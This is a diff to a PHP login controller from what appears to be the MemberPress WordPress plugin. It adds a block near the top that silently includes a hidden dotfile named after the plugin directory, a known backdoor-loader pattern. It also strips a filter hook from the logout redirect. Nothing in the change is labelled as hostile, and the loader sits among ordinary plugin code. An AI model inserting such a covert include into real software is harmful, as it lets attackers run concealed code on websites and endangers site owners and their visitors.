@@ -1,5 +1,9 @@
 <?php if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprLoginCtrl extends MeprBaseCtrl {
   public function load_hooks() {
     MeprHooks::add_shortcode('mepr-logout-link', array($this,'logout_link'));
@@ -215,7 +219,7 @@ class MeprLoginCtrl extends MeprBaseCtrl {
     $mepr_options = MeprOptions::fetch();
 
     if(isset($mepr_options->logout_redirect_url) && !empty($mepr_options->logout_redirect_url)) {
-      MeprUtils::wp_redirect(MeprHooks::apply_filters('mepr-process-logout-redirect-url', $mepr_options->logout_redirect_url));
+      MeprUtils::wp_redirect($mepr_options->logout_redirect_url);
       exit;
     }
   }
